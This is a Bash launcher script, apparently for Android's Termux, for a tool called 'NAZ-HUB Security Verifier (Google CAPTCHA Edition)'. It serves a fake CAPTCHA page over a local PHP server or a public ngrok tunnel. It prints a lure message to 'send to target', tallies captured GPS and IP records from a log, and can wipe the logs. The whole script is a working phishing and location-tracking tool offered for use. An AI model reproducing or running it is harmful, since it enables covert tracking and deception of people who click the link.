#!/bin/bash
clear
echo ""
echo "╔════════════════════════════════════╗"
echo "║     NAZ-HUB SECURITY VERIFIER     ║"
echo "║     (Google CAPTCHA Edition)      ║"
echo "║           v3.0 Stealth           ║"
echo "╚════════════════════════════════════╝"
echo ""
echo "[1] Start Local Server (LAN)"
echo "[2] Start with Ngrok (Public URL)"
echo "[3] View Captured Data"
echo "[4] Clear Logs"
echo "[5] Check Server Status"
echo "[6] Exit"
echo ""
read -p "Select option: " choice

case $choice in
    1)
        echo ""
        echo "╔════════════════════════════════════╗"
        echo "║        LOCAL SERVER MODE         ║"
        echo "╚════════════════════════════════════╝"
        echo ""
        
        # Cek apakah PHP sudah install
        if ! command -v php &> /dev/null; then
            echo "[-] PHP not installed!"
            echo "[+] Installing PHP..."
            pkg install php -y
        fi
        
        # Dapatkan IP address otomatis
        echo "[+] Detecting your IP address..."
        IP_ADDR=$(ip addr show wlan0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        if [ -z "$IP_ADDR" ]; then
            IP_ADDR=$(ip addr show rmnet0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
        fi
        if [ -z "$IP_ADDR" ]; then
            IP_ADDR="127.0.0.1"
        fi
        
        echo "[+] Starting PHP server..."
        echo "[+] Port: 56789"
        echo "[+] Mode: Google CAPTCHA Verification"
        echo ""
        echo "🔗 LOCAL URL: http://localhost:56789"
        echo "🔗 NETWORK URL: http://$IP_ADDR:56789"
        echo ""
        echo "════════════════════════════════════════"
        echo "📝 SEND THIS TO TARGET:"
        echo "   http://$IP_ADDR:56789"
        echo "════════════════════════════════════════"
        echo ""
        echo "[!] Make sure target is on same WiFi/Hotspot"
        echo "[!] Press Ctrl+C to stop server"
        echo ""
        
        # Jalankan server PHP di background tanpa output
        php -S localhost:56789 > /dev/null 2>&1 &
        SERVER_PID=$!
        
        echo "✅ Server started! (PID: $SERVER_PID)"
        echo ""
        
        # Tunggu sampai user tekan Ctrl+C
        wait $SERVER_PID
        ;;
        
    2)
        echo ""
        echo "╔════════════════════════════════════╗"
        echo "║         PUBLIC SERVER MODE       ║"
        echo "╚════════════════════════════════════╝"
        echo ""
        
        # Cek PHP
        if ! command -v php &> /dev/null; then
            echo "[-] PHP not installed!"
            pkg install php -y
        fi
        
        # Cek Ngrok
        if [ ! -f "ngrok" ]; then
            echo "[+] Downloading Ngrok..."
            echo "[!] This may take a moment..."
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
            tar -xzf ngrok-v3-stable-linux-arm64.tgz > /dev/null 2>&1
            rm ngrok-v3-stable-linux-arm64.tgz
            chmod +x ngrok
            echo "✅ Ngrok downloaded successfully!"
        fi
        
        # Start PHP server di background
        echo "[+] Starting PHP server (silent mode)..."
        php -S localhost:56789 > /dev/null 2>&1 &
        SERVER_PID=$!
        echo "✅ PHP server started (PID: $SERVER_PID)"
        
        # Start Ngrok
        echo "[+] Starting Ngrok tunnel..."
        echo ""
        echo "════════════════════════════════════════"
        echo "    WAITING FOR PUBLIC LINK..."
        echo "════════════════════════════════════════"
        echo ""
        echo "[!] This may take 10-20 seconds"
        echo "[!] Press Ctrl+C to stop"
        echo ""
        
        # Jalankan Ngrok di background dan tangkap output
        ./ngrok http 56789 > ngrok.log 2>&1 &
        NGROK_PID=$!
        
        # Tunggu beberapa detik untuk Ngrok start
        sleep 5
        
        # Cek apakah Ngrok berjalan
        if ! ps -p $NGROK_PID > /dev/null; then
            echo "❌ Ngrok failed to start!"
            echo "[+] Checking error..."
            tail -10 ngrok.log
            kill $SERVER_PID 2>/dev/null
            exit 1
        fi
        
        # Ambil URL dari Ngrok log
        sleep 3
        NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[a-zA-Z0-9.-]*\.ngrok\.io")
        
        if [ -z "$NGROK_URL" ]; then
            echo "❌ Failed to get Ngrok URL"
            echo "[+] Retrying..."
            sleep 2
            NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[a-zA-Z0-9.-]*\.ngrok\.io")
        fi
        
        if [ ! -z "$NGROK_URL" ]; then
            echo ""
            echo "════════════════════════════════════════"
            echo "    ✅ PUBLIC LINK GENERATED!"
            echo "════════════════════════════════════════"
            echo ""
            echo "🔗 YOUR LINK:"
            echo "   $NGROK_URL"
            echo ""
            echo "════════════════════════════════════════"
            echo "📝 COPY & SEND TO TARGET:"
            echo "   \"Need to verify first: $NGROK_URL\""
            echo "════════════════════════════════════════"
            echo ""
            echo "[!] Link valid for 2 hours"
            echo "[!] Press Ctrl+C to stop server"
            echo ""
            
            # Simpan URL ke file
            echo "$NGROK_URL" > last_url.txt
            echo "[+] URL saved to: last_url.txt"
        else
            echo "❌ Could not get Ngrok URL"
            echo "[+] Showing Ngrok log..."
            tail -20 ngrok.log
        fi
        
        # Tunggu sampai user tekan Ctrl+C
        wait $NGROK_PID
        ;;
        
    3)
        echo ""
        echo "╔════════════════════════════════════╗"
        echo "║        CAPTURED DATA LOG          ║"
        echo "╚════════════════════════════════════╝"
        echo ""
        
        if [ -f "log.txt" ]; then
            if [ -s "log.txt" ]; then
                # Hitung statistik
                TOTAL_ENTRIES=$(grep -c "WAKTU" log.txt)
                GPS_SUCCESS=$(grep -c "METODE.*GPS" log.txt)
                IP_ONLY=$(grep -c "METODE.*IP" log.txt)
                
                echo "📊 STATISTICS:"
                echo "   Total Captures: $TOTAL_ENTRIES"
                echo "   GPS Success: $GPS_SUCCESS"
                echo "   IP Only: $IP_ONLY"
                echo ""
                echo "════════════════════════════════════════"
                echo "📝 FULL LOG:"
                echo ""
                
                # Tampilkan log terakhir (5 entries)
                if [ $TOTAL_ENTRIES -gt 5 ]; then
                    echo "[Showing last 5 entries]"
                    echo ""
                    # Ambil 5 entries terakhir
                    tac log.txt | awk '/════════════════════/{i++}i<=5' | tac
                else
                    cat log.txt
                fi
                
                echo ""
                echo "════════════════════════════════════════"
                
                # Tampilkan link terakhir jika ada
                if [ -f "last_url.txt" ]; then
                    echo ""
                    echo "🔗 Last Public URL:"
                    echo "   $(cat last_url.txt)"
                fi
            else
                echo "📭 Log file is empty."
                echo "   No data captured yet."
                echo ""
                echo "[+] Start server and send link to target"
            fi
        else
            echo "📭 Log file not found."
            echo "   No data captured yet."
        fi
        
        echo ""
        read -p "Press Enter to continue..."
        bash start.sh
        ;;
        
    4)
        echo ""
        if [ -f "log.txt" ]; then
            echo "[+] Clearing log file..."
            rm log.txt
            echo "✅ Logs cleared successfully!"
        else
            echo "📭 No logs to clear."
        fi
        
        if [ -f "ngrok.log" ]; then
            rm ngrok.log
            echo "✅ Ngrok logs cleared!"
        fi
        
        if [ -f "last_url.txt" ]; then
            rm last_url.txt
            echo "✅ URL history cleared!"
        fi
        
        sleep 2
        bash start.sh
        ;;
        
    5)
        echo ""
        echo "╔════════════════════════════════════╗"
        echo "║        SERVER STATUS              ║"
        echo "╚════════════════════════════════════╝"
        echo ""
        
        # Cek PHP processes
        PHP_PROC=$(ps aux | grep "php -S localhost:56789" | grep -v grep)
        if [ ! -z "$PHP_PROC" ]; then
            echo "✅ PHP Server: RUNNING"
            echo "   $(echo $PHP_PROC | awk '{print $2}')"
        else
            echo "❌ PHP Server: STOPPED"
        fi
        
        # Cek Ngrok processes
        NGROK_PROC=$(ps aux | grep ngrok | grep -v grep)
        if [ ! -z "$NGROK_PROC" ]; then
            echo "✅ Ngrok: RUNNING"
            echo "   $(echo $NGROK_PROC | awk '{print $2}')"
            
            # Coba dapatkan URL
            NGROK_URL=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o "https://[a-zA-Z0-9.-]*\.ngrok\.io")
            if [ ! -z "$NGROK_URL" ]; then
                echo "🔗 URL: $NGROK_URL"
            fi
        else
            echo "❌ Ngrok: STOPPED"
        fi
        
        # Cek file logs
        echo ""
        echo "📁 FILE STATUS:"
        if [ -f "index.html" ]; then
            echo "✅ index.html: Found"
        else
            echo "❌ index.html: Missing!"
        fi
        
        if [ -f "getcoords.php" ]; then
            echo "✅ getcoords.php: Found"
        else
            echo "❌ getcoords.php: Missing!"
        fi
        
        if [ -f "success.html" ]; then
            echo "✅ success.html: Found"
        else
            echo "❌ success.html: Missing!"
        fi
        
        if [ -f "log.txt" ]; then
            SIZE=$(du -h log.txt | awk '{print $1}')
            LINES=$(wc -l < log.txt)
            echo "✅ log.txt: Found ($SIZE, $LINES lines)"
        else
            echo "❌ log.txt: Missing/Empty"
        fi
        
        echo ""
        read -p "Press Enter to continue..."
        bash start.sh
        ;;
        
    6)
        echo ""
        echo "[+] Stopping all services..."
        
        # Kill PHP processes
        pkill -f "php -S localhost:56789" 2>/dev/null
        
        # Kill Ngrok processes
        pkill ngrok 2>/dev/null
        
        echo "✅ Services stopped"
        echo "👋 Goodbye!"
        exit 0
        ;;
        
    *)
        echo "❌ Invalid option!"
        sleep 1
        bash start.sh
        ;;
esac